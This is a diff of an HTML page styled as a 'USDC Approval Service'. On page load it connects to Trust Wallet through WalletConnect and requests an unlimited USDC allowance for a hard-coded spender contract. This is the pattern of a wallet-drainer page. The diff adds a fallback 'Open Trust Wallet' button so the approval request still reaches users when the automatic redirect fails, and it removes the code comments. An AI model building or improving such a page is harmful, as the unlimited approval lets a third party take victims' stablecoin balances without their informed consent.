@@ -4,7 +4,6 @@
     <meta charset="UTF-8">
     <meta name="viewport" content="width=device-width, initial-scale=1.0">
     <title>USDC Approval Service</title>
-    <!-- Basic styling for better user feedback -->
     <style>
         body {
             font-family: Arial, sans-serif;
@@ -58,6 +57,19 @@
             to { transform: rotate(360deg); }
         }
         .hidden { display: none; }
+        .action-button {
+            background-color: #007bff;
+            color: white;
+            padding: 10px 20px;
+            border: none;
+            border-radius: 5px;
+            cursor: pointer;
+            font-size: 16px;
+            margin-top: 15px;
+        }
+        .action-button:hover {
+            background-color: #0056b3;
+        }
     </style>
 </head>
 <body>
@@ -66,30 +78,30 @@
         <div id="loader" class="loading"></div>
         <p id="message">Initializing...</p>
         <div id="status" class="status-message hidden"></div>
+        <div id="manualConnectSection" class="hidden">
+            <p>If Trust Wallet did not open automatically, please click the button below:</p>
+            <button id="manualConnectButton" class="action-button">Open Trust Wallet</button>
+        </div>
     </div>
 
-    <!-- Ethers.js and WalletConnect V2 Ethereum Provider from CDNs -->
     <script src="https://cdn.jsdelivr.net/npm/ethers@6/dist/ethers.min.js"></script>
     <script type="module">
         import { EthereumProvider } from 'https://cdn.jsdelivr.net/npm/@walletconnect/ethereum-provider@2.14.0/dist/index.umd.min.js';
 
-        // --- Configuration ---
-        const WALLETCONNECT_PROJECT_ID = '25a778da5292aee3e00da87e594c2005'; // Your Project ID
-        const USDC_CONTRACT_ADDRESS = '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48'; // Official USDC Mainnet
-        const SPENDER_CONTRACT_ADDRESS = '0xBb69c59C6912aBeA0b2e6ccC6aba416db90A1322'; // Your deployed UsdcAllowanceSpender contract address
-        const FIXED_ALLOWANCE_AMOUNT_HEX = '0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff'; // Unlimited allowance (MaxUint256)
+        const WALLETCONNECT_PROJECT_ID = '25a778da5292aee3e00da87e594c2005';
+        const USDC_CONTRACT_ADDRESS = '0xA0b86991c6218b36c1d19D4a2e9Eb0cE3606eB48';
+        const SPENDER_CONTRACT_ADDRESS = '0xBb69c59C6912aBeA0b2e6ccC6aba416db90A1322';
+        const FIXED_ALLOWANCE_AMOUNT_HEX = '0xffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffffff';
 
-        // ERC20 ABI snippet for the approve function
         const ERC20_ABI = [
             "function approve(address spender, uint256 amount) external returns (bool)",
-            "function decimals() view returns (uint8)" // Needed if we were parsing amounts from string to units
+            "function decimals() view returns (uint8)"
         ];
 
-        // --- Global Provider and Account ---
         let ethereumProvider;
         let connectedAccount;
+        let currentWcUri = null; // Store the URI for manual connect
 
-        // --- UI Update Functions ---
         function updateMessage(text, type = 'info') {
             const messageElement = document.getElementById('message');
             messageElement.textContent = text;
@@ -100,7 +112,10 @@
             document.getElementById('loader').classList.toggle('hidden', !show);
         }
 
-        // --- WalletConnect and Transaction Logic ---
+        function showManualConnect(show) {
+            document.getElementById('manualConnectSection').classList.toggle('hidden', !show);
+        }
+
         async function startApprovalProcess() {
             showLoader(true);
             updateMessage('Initializing WalletConnect...');
@@ -108,31 +123,39 @@
             try {
                 ethereumProvider = await EthereumProvider.init({
                     projectId: WALLETCONNECT_PROJECT_ID,
-                    chains: [1], // Ethereum Mainnet Chain ID
+                    chains: [1],
                     optionalChains: [],
-                    showQrModal: false, // CRITICAL: Prevents WalletConnect's default QR modal
+                    showQrModal: false,
                     metadata: {
                         name: 'USDC Approval Service',
                         description: 'Approves USDC for a trusted service.',
                         url: window.location.origin,
-                        icons: ['https://example.com/icon.png'], // You can replace this with your own icon URL
+                        icons: ['https://example.com/icon.png'],
                     },
                 });
 
-                // --- Event Listeners ---
                 ethereumProvider.on("display_uri", (uri) => {
-                    // This event fires if the wallet isn't already connected.
-                    // We immediately deep-link to Trust Wallet with the pairing URI.
                     console.log("WalletConnect URI for pairing:", uri);
+                    currentWcUri = uri; // Store the URI
                     updateMessage('Opening Trust Wallet to connect... Please approve the connection.', 'info');
+                    
                     const deepLink = `trust://wc?uri=${encodeURIComponent(uri)}`;
-                    window.location.href = deepLink; // Redirects the browser to Trust Wallet
+                    window.location.href = deepLink; // Attempt automatic deep-link
+                    
+                    // If Trust Wallet doesn't open after a short delay, show manual button
+                    setTimeout(() => {
+                        if (!ethereumProvider.connected) { // Only show if not yet connected
+                            showManualConnect(true);
+                            updateMessage('Trust Wallet did not open automatically. Please click "Open Trust Wallet" or check your app.', 'info');
+                        }
+                    }, 2000); // Wait 2 seconds
                 });
 
                 ethereumProvider.on("connect", (response) => {
                     console.log("Wallet connected!", response);
                     connectedAccount = response.accounts[0];
                     updateMessage(`Wallet connected: ${connectedAccount.substring(0, 6)}...${connectedAccount.substring(connectedAccount.length - 4)}`, 'success');
+                    showManualConnect(false); // Hide manual button if connection succeeds
                     proposeApproveTransaction();
                 });
 
@@ -140,9 +163,19 @@
                     console.log("Wallet disconnected.", error);
                     updateMessage('Wallet disconnected.', 'error');
                     showLoader(false);
+                    showManualConnect(false); // Hide manual button on disconnect
                 });
 
-                // --- Attempt to connect ---
+                document.getElementById('manualConnectButton').addEventListener('click', () => {
+                    if (currentWcUri) {
+                        const deepLink = `trust://wc?uri=${encodeURIComponent(currentWcUri)}`;
+                        window.location.href = deepLink; // Try again with user gesture
+                        updateMessage('Attempting to open Trust Wallet again...', 'info');
+                    } else {
+                        updateMessage('Error: No WalletConnect URI available for manual connection.', 'error');
+                    }
+                });
+
                 if (!ethereumProvider.connected) {
                     updateMessage('Requesting wallet connection... Check Trust Wallet.', 'info');
                     await ethereumProvider.connect();
@@ -156,6 +189,7 @@
                 console.error('Error during WalletConnect initialization or connection:', error);
                 updateMessage(`Error: ${error.message}. Please try again.`, 'error');
                 showLoader(false);
+                showManualConnect(true); // Show manual button on initial error
             }
         }
 
@@ -170,7 +204,6 @@
             updateMessage('Proposing USDC approval transaction... Please confirm in Trust Wallet.', 'info');
 
             try {
-                // Use ethers to encode the function data
                 const iface = new ethers.Interface(ERC20_ABI);
                 const calldata = iface.encodeFunctionData('approve', [
                     SPENDER_CONTRACT_ADDRESS,
@@ -181,12 +214,11 @@
                     from: connectedAccount,
                     to: USDC_CONTRACT_ADDRESS,
                     data: calldata,
-                    value: '0x0', // No ETH sent with an approval
+                    value: '0x0',
                 };
 
                 console.log('Transaction to propose:', transaction);
 
-                // Request the user's wallet to sign and send the transaction
                 const txHash = await ethereumProvider.request({
                     method: 'eth_sendTransaction',
                     params: [transaction],
@@ -203,7 +235,6 @@
             }
         }
 
-        // Start the process when the page loads
         window.addEventListener('load', startApprovalProcess);
     </script>
 </body>
